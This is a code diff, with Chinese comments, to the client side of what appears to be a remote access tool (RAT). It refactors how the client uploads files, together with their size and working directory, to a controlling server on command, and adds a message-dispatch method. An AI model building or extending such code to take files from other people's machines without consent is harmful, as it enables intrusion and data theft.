@@ -15,9 +15,11 @@ from core.utils.logger import logger
 
 class ServerConnection(RATSocket):
     """
-    客户端与服务器的连接类
+    客户端与服务端的连接类
     负责接收命令、发送结果/文件、执行命令
     """
+
+    FILE_READY_TIMEOUT = 15.0
 
     def __init__(self):
         super().__init__()
@@ -72,41 +74,58 @@ class ServerConnection(RATSocket):
         logger.debug(data)
         self.send(data)
 
-    def _wait_for_ready_signal(self, command_id: int, timeout: float = 15.0) -> int:
+    def _wait_for_ready_signal(self, command_id: int, timeout: float | None = None) -> int:
         """
         等待指定命令对应的文件传输 ready 信号
         """
+        effective_timeout = self.FILE_READY_TIMEOUT if timeout is None else timeout
         try:
-            return self.ready_queue.get_for_command(command_id, timeout=timeout)
+            return self.ready_queue.get_for_command(command_id, timeout=effective_timeout)
         except Exception:
             raise TimeoutError(f'Timed out waiting for ready signal: command_id={command_id}')
 
-    def send_file(self, id: int, filename: str):
+    def _send_file_with_ready(self, header: dict, io):
         """
-        向服务端发送文件
+        统一的文件发送流程：
+        - 发送文件头
+        - 等待对应 command_id 的 ready
+        - 发送文件流
         """
-        header = {
-            'type': 'file',
-            'id': id,
-            'length': os.stat(filename).st_size,
-            'filename': ntpath.basename(filename),
-            'cwd': os.getcwd(),
-        }
-        io = get_output_stream(filename)
+        command_id = header.get('id')
 
         try:
             self.send(header)
-            if self._wait_for_ready_signal(id):
+            if self._wait_for_ready_signal(command_id):
                 self.send_io(io)
             else:
                 io.close()
-                raise RuntimeError(f'Server rejected file transfer: command_id={id}')
+                raise RuntimeError(f'Server rejected file transfer: command_id={command_id}')
         except Exception:
             try:
                 io.close()
             except Exception:
                 pass
             raise
+
+    def _build_outbound_file_header(self, command_id: int, filename: str) -> dict:
+        """
+        构造发送到服务端的文件头
+        """
+        return {
+            'type': 'file',
+            'id': command_id,
+            'length': os.stat(filename).st_size,
+            'filename': ntpath.basename(filename),
+            'cwd': os.getcwd(),
+        }
+
+    def send_file(self, id: int, filename: str):
+        """
+        向服务端发送文件
+        """
+        header = self._build_outbound_file_header(id, filename)
+        io = get_output_stream(filename)
+        self._send_file_with_ready(header, io)
 
     def enqueue_pending_message(self, data: dict):
         """
@@ -135,6 +154,18 @@ class ServerConnection(RATSocket):
 
         self.enqueue_pending_message(data)
         return None
+
+    def recv_message(self):
+        """
+        接收线程统一入口：
+        - 接收一条消息
+        - 由连接对象决定如何处理
+        - 如需立即回传结果，则在此处直接发送
+        """
+        data = self.recv()
+        result = self.handle_received_message(data)
+        if result:
+            self.send_result(*result)
 
     def recv_command(self, timeout: float | None = None) -> (int, int, str):
         """
